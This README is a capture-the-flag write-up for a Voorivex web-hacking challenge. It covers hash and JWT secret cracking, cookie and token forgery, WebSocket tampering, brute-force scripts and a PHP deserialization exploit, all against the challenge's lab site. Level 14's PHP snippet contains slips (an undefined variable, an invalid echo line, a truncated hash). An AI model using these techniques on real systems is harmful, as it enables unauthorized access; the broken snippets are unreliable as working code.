# Voorivex-Challange-Blackhole
This repo provides solution to Voorivex challenge Escape the Blackhole

- ### Level 1

```text
1.crack the hash : f62e05eafec3231205788cba3ef91d54
2.It is : interstellar
3.go to : https://talent.voorivex.academy/interstellar/
```

- ### Level 2

```text
1.Send a post request to this address : https://talent.voorivex.academy/interstellar/
with parameters like this: action=land&city=moscow
2.You will get : "/gC6qDkHV"
3.Go to : https://talent.voorivex.academy/gC6qDkHV/
```

- ### Level 3

```text
1.Change the origin to anything and send the request
2.Send this command: curl https://talent.voorivex.academy/gC6qDkHV/ --header "origin: test.com"
3.You will get: "/R3hYMMjH"
4.Go to : https://talent.voorivex.academy/R3hYMMjH/
```

- ### Level 4

```text
1.Change local host file to : 127.0.0.1 andromeda
2.Run a simple python http server with : python3 -m http.server 80
3.In browser go to : http://andromeda
4.Open console and put the following script in it (set browser proxy to send requests to burp)
```

```javascript
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
    if (xhr.readyState == XMLHttpRequest.DONE) {
        console.log(xhr.responseText);
    }
}
xhr.open('PUT', 'https://talent.voorivex.academy/R3hYMMjH/', true);
xhr.send(null);
```

```text
5.In burp you see an OPTIONS request, the flag is in the response : "/NBeT27bk"
6.Go to : https://talent.voorivex.academy/NBeT27bk/
```

- ### Level 5

```text
1.Send a simple GET request to https://talent.voorivex.academy/NBeT27bk/
2.Response has so many spaces, look at the end, the flag is : /KnYN4Ike
3.Go to : https://talent.voorivex.academy/KnYN4Ike
```

- ### Level 6

```text
1.View page source and take the binary numbers, split them into 8 characters blocks
like this : 00110011 00111000 00101110 00111000 00111000 00110011 00110000 00110110 00110100 00111001 00101100 00101101 00110111 00110111 00101110 00110000 00110001 00110110 00110010 00110111 00111000 00110110
2.Convert it to ASCII and it becomes: 38.8830649,-77.0162786
3.look at page javascript, there is function called `verifyCoordinates`
4.In the browser console call this function with the cordinates found in step 2
5.Watch the request in burp, it gives you the flag: "/kPEL1eTA"
6.Go to: https://talent.voorivex.academy/kPEL1eTA
```

- ### Level 7

```text
1.Check the cookies, there is a cookie -> dXNlcgQ%3D
2.URL Decode and then b64decode in browser console like this
```

```javascript
>> atob('dXNlcgQ=')
<- "user\u0004"
```

```text
3.There is a relation between `user` number of characters (4) and `\u0004`
4.To become `admin` (5 character), we should send `admin\u0005`
5.In browser console type:
```

```javascript
>> btoa('admin\u0005')
<- "YWRtaW4F"
```

```text
6.Put `YWRtaW4F` in cookie `role` and send it, you will get : "/jKD7AlXH"
7.Go to : https://talent.voorivex.academy/jKD7AlXH
```

- ### Level 8

```text
1.You have two cookies this time
- role
- secure_role

2.The `role` cookie works as previous level, but `secure_role` is combination of
user.LONGHASH, there is also a javascript in the page which shows how this hash is generated

3.We need the `secretKey` in order to make a hash for user admin

4.Sending any arbitary data in `secure_role` cookie, generates an error that shows the secret key : `int3rstellarKey`

5.Use this key and call the function `signString` in browser console like this : signString('admin','int3rstellarKey')
it gives you the hash for user admin -> ab5479d103913c42eeb210220e74677bb48f53fbb7c7dae4ad62335bd51e85cc

6.send the request this time like this :
- `role` cookie should be : `YWRtaW4F` (same as previous level)
- `secure_role` cookie should be : `YWRtaW4=.ab5479d103913c42eeb210220e74677bb48f53fbb7c7dae4ad62335bd51e85cc`
you will get the flag : `"/dUwsDlDr"`

7.Go to : https://talent.voorivex.academy/dUwsDlDr
```

- ### Level 9

```text
1.See the page source, it says send `?showme` as parameter, do it and you will get a php code:
```

```php
<?php
error_reporting(0);
require 'salt.php';

if (array_key_exists('showme', $_GET)) {
    show_source('index.php');
    die();
}

function generateHashWithSalt($password, $salt)
{
    $combined = $password . '<>' . $salt;
    $hashedPassword = md5($combined);

    return $hashedPassword;
}

if (isset($_GET['password'])) {
    // https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
    if (generateHashWithSalt($_GET['password'], $salt) === '947f7730925f722c020c241d10fd930e') {
        echo getenv('LEVEL_10');
        die();
    } else {
        echo 'Invalid password!';
        die();
    }
}
?>
```

```text
2.You should find the correct salt and password to reach to the hash
- for password list download the `10k-most-common.txt` from the given link in comment
- for salt, look at the page sentence : `challenges is the salt . . .`, so the salt is the word `challenges`

3.Write a python code to calculate the hash for you :
```

```python
import hashlib


with open('wordlist.txt','r') as f:
    password_lines = f.readlines()


def generate_md5_hash(password, salt):
    md5_hash = hashlib.md5()
    combined = f'{password}<>{salt}'
    md5_hash.update(combined.encode('utf-8'))
    hashedPassword =md5_hash.hexdigest()
    return hashedPassword

for password in password_lines:
    striped_password = password.strip()
    result = generate_md5_hash(striped_password,'challenges')
    if result.strip() == '947f7730925f722c020c241d10fd930e':
        print(f'found password : {striped_password}')
        break
```

```text
the password is `space`

4.Send the password as parameter to get the flag: https://talent.voorivex.academy/dUwsDlDr/?password=space
you wil get : "/rqp2yOxi"

5.Go to : https://talent.voorivex.academy/rqp2yOxi/
```

- ### Level 10

```text
1.Send this request : https://talent.voorivex.academy/rqp2yOxi/?pass[]

2.You will get the flag in error page : /udsWoshd

3.Go to : https://talent.voorivex.academy/udsWoshd
```


- ### Level 11

```text
1.See page source and js, it uses websocket messages

2.In burp check websocket, it send a message to server like this:
{"level":"/udsWoshd","data":{"next":false}}

3.Send this message to server :
{"level":"/udsWoshd","data":{"next":true}}

4.It gives you the flag: "/rNNVU329"

5.Go to : https://talent.voorivex.academy/rNNVU329
```


- ### Level12

```text
1.This level uses websocket again, send `help` to get available actions:
- issue_token
- auth
- users

2.Send an issue_token to get a jwt token, the payload is :

{
  "user": "anonymous",
  "iat": 1709169921,
  "exp": 1709173521
}

3.Try to crack it with `jwt_tool.py` and this wordlist:
https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list
using this command :
```

```bash
python3 jwt_tool.py 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYW5vbnltb3VzIiwiaWF0IjoxNzA5MTY5OTIxLCJleHAiOjE3MDkxNzM1MjF9.506xdFYqhL1Vq7bFfSjNtVkTmr9Lip5xF1EVXOAouUg' -C -d jwt.secrets.list
```

```text
the key is : `supersecretkey`
4.Now we need to generate a new jwt using this key and user `admin`
i wrote a python code :
```

```python
import jwt

payload_data = {
  "user": "admin"
}
encoded_token = jwt.encode(payload_data, 'supersecretkey', algorithm="HS256")
print(encoded_token)
```

```text
5.Now send this token to this url : https://talent.voorivex.academy/rNNVU329/
in Authorization header like this : `Authorization: bearer YOUR_TOKEN_HERE`

6.It gives you the flag : "/hrBlNawD"

7.Go to : https://talent.voorivex.academy/hrBlNawD/
```

- ### Level13

```text
1.This level uses websocket too, but the system already chooses a number
and wants you to guess it

2.In order to find the right number, first we should detect the least and most acceptable
number that system accepts, it is from 1000-9999, check it by system response

3.Since we do not know the number we should generate all the numbers available in this range

4.I wrote a simple python code to generate the numbers:
```

```python
total_codes = ''
for i in range(1000,10000,1):
    total_codes += f'"{i}",'

final_codes = total_codes[:-1]

with open('file.txt','a') as f:
    f.write(final_codes)
```

```text
open the file.txt and copy all the values and put it in data parameter as an array like this:

{"level":"/hrBlNawD","data":{"code":["1000","1001","1002",...,"9999"]}}

and send it, it will give you : /2X8oLemQ

5.Go to : https://talent.voorivex.academy/2X8oLemQ
```


- ### Level14

```text
1.Go to this address : https://talent.voorivex.academy/2X8oLemQ?showme

2.There is a php code :
```

```php
<?php
error_reporting(0);

require 'token.php';
$cookieName = 'very_secure_role';

if ($_SERVER['REQUEST_METHOD'] == 'GET' && isset($_GET['showme'])) {
    show_source('index.php');
    exit;
}

class Flag
{
    private $action;
    function __destruct()
    {
        if ($this->action == 'get') {
            echo getenv('LEVEL_15');
            die();
        }
    }
}

function generateAndSaveToken($filename = "token.php")
{
    // Generate token
    $token = substr((double) microtime() * 1000000, 0, 6);

    // Save token to PHP file
    $phpCode = "<?php\n\$generatedToken = '$token';";
    file_put_contents($filename, $phpCode);

    return $token;
}

function generateHmac($stringToSign, $secretKey = null)
{
    global $generatedToken;
    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;

    $hashAlgorithm = 'sha256';
    $hmac = hash_hmac($hashAlgorithm, $stringToSign, $secretKey, true);

    $hexHmac = bin2hex($hmac);

    return $hexHmac;
}

function validateHmac($stringToValidate, $providedHmac, $secretKey = null)
{
    global $generatedToken;
    $secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;

    $hashAlgorithm = 'sha256';
    $generatedHmac = hash_hmac($hashAlgorithm, $stringToValidate, $secretKey, true);
    $generatedHexHmac = bin2hex($generatedHmac);

    // Use a secure comparison function to avoid timing attacks
    $isValid = hash_equals($providedHmac, $generatedHexHmac);

    return $isValid;
}

if (!isset($_COOKIE[$cookieName])) {
    setcookie($cookieName, serialize('TARS') . '.' . generateHmac(serialize('TARS')), time() + 86400, '/');
} else {
    $cookieValue = explode('.', $_COOKIE[$cookieName])[0];
    $signiture = explode('.', $_COOKIE[$cookieName])[1];

    if (validateHmac($cookieValue, $signiture)) {
        unserialize($cookieValue);
    }
}

// generateAndSaveToken()
?>

```

this code has deserialization vulnerability, the gole is to make this line work :

```php
if (validateHmac($cookieValue, $signiture)) {
        unserialize($cookieValue);
    }
```


function `validateHmac()` does these operations :
- gets a string ($cookievalue)
- gets a signed hmac value ($signature)
- if there is a secretkey, takes it, if not, uses `global $generatedToken;`
- calculates hmac value itself
- compares it with provided hmac
- returns true if match

we need to provide a serialized data and its hmac in such a way that validateHmac function becomes true
a serialized data that matches the class `Flag` should be this : `O:4:"Flag":1:{s:6:"action";s:3:"get";}` (i talk about it later)
and we need to sign it.

in order to sign it, we should use the function `generateHmac()` that does these operations:
- gets a string to sign (serialized data)
- if there is a secretkey, takes it, if not, uses `global $generatedToken;`

if you try to generate the hmac, you need a token, which is mentioned in function `generateAndSaveToken()`

now pay close attention to cookies in bup, every time you remove the `very_secure_role` cookie
the page, gives you a `set-cookie` header but the important thing :

#### the set-cookie value is always the same
it has this value :
`very_secure_role=s%3A4%3A%22TARS%22%3B.3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226a`
in decoded format it is :
`very_secure_role=s:4:"TARS";.3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226`

huge attention to this behavior is the golden key, since according to php code on the page
and the way `generateAndSaveToken()` function work, every time you load the page you should get
a new set-cookie signatuer, but this does not happen, and that's because `generateAndSaveToken()`
function is commented in the last line `// generateAndSaveToken()`, see that ?

so there is only one meaning of this, and that is the page is loading `$generatedToken` from another way, evidences:
- this variable is defined as `global $generatedToken;` -> to be available every where in the code
- the page is using `require 'token.php';`

and that means `$generatedToken` is in `token.php` and has a fixed value

#### Let the game begin
now here is the situation :
- we have an already calculated hmac hash value : `3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226` in the set-cookie header
- we have the function that can generate hashes : `generateHmac`
- we have this line in the function : `$secretKey = ($secretKey !== null) ? $secretKey : $generatedToken;`
- what we do not have is the value of token that generated the hash value
- we know that the token must be a 6 digit value -> this line `$token = substr((double) microtime() * 1000000, 0, 6);` in `generateAndSaveToken()` function

#### we should find the token
to find the token, we need to use all possible 6 digit numbers available and put it in `generateHmac()` function
and compare it to the hash that set-cookie header sets for us :

```php
<?php
function generateHmac($stringToSign, $generatedToken)
{
    
    $hashAlgorithm = 'sha256';
    $hmac = hash_hmac($hashAlgorithm, $stringToSign, $generatedToken, true);

    $hexHmac = bin2hex($hmac);

    return $hexHmac;
}

for ($i = 100000; $i <= 999999; $i++) {
    $generatedToken = $i;
    $myhash = generateHmac(serialize('TARS'),$generatedToken);
    if ($myhash === '3ed83ef275af0ea493507ca4aa2bb645bd30cf29f27c6f8a8babe6b54f9b226a'){
    echo $generatedToken;
    }
}

?>

```

the code above finds the token -> `934573`

#### Calculate hmac with token and serialize object
now that we have the token, we should generate a hmac for the serialized data (O:4:"Flag":1:{s:6:"action";s:3:"get";})
to get the serialized object the code below helps (notice i changed `private` to `public` to get correct serialization):

```php
class Flag
{
    public $action ='get';
    function __destruct()
    {
        if ($this->action == 'get') {
            echo getenv('LEVEL_15');
            die();
        }
    }
}

$myaction = new Flag();
$generatedhmac = generateHmac(serialize($user),934573);
echo serialize($myaction);
echo <br>;
echo $generatedhmac;
```

output :

```text
O:4:"Flag":1:{s:6:"action";s:3:"get";}
efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640
```

#### Final step
now we have both data we need, and `validateHmac()` can be satisfied
just put those strings like this together : `O:4:"Flag":1:{s:6:"action";s:3:"get";}.efa9fbdb0bcb5bdce882e8b156321259663538f57490268f81f43538c99e6640`
put it in `very_secure_role` cookie, url encode it and send it

3.You will get this : "/JTGZg6NV"
4.Go to : https://talent.voorivex.academy/JTGZg6NV/













